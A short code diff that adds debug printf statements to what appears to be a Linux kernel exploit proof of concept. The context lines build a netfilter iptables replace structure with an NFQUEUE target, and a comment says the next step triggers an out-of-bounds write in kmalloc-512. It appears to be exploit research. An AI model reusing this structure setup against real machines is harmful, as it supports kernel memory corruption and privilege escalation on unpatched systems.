@@ -27,6 +27,8 @@ int main(int argc, char *argv[]) {
     struct xt_entry_target target;
   } data = {0};
 
+  printf("sizeof(data.replace): %d\n",sizeof(data.replace));
+
   data.replace.num_counters = 1;
   data.replace.num_entries = 1;
   data.replace.size = (sizeof(data.entry) + sizeof(data.match) +
@@ -44,6 +46,14 @@ int main(int argc, char *argv[]) {
   data.target.u.user.target_size = sizeof(data.target);
   strcpy(data.target.u.user.name, "NFQUEUE");
   data.target.u.user.revision = 1;
+
+ 
+  printf("sizeof(data.pad): %d\n",sizeof(data.pad));
+  printf("sizeof(data.entry): %d\n",sizeof(data.entry));
+  printf("data.replace.size: %d\n",data.replace.size);
+  printf("sizeof(data.target): %d\n",sizeof(data.target));
+  printf("sizeof(data.match): %d\n",sizeof(data.match));
+  printf("sizeof(data.replace2): %d\n",sizeof(data.replace));
 
   // Trigger Out-Of-Bounds write in kmalloc-512 (offset 0x200-0x204 overwritten
   // with zeros).
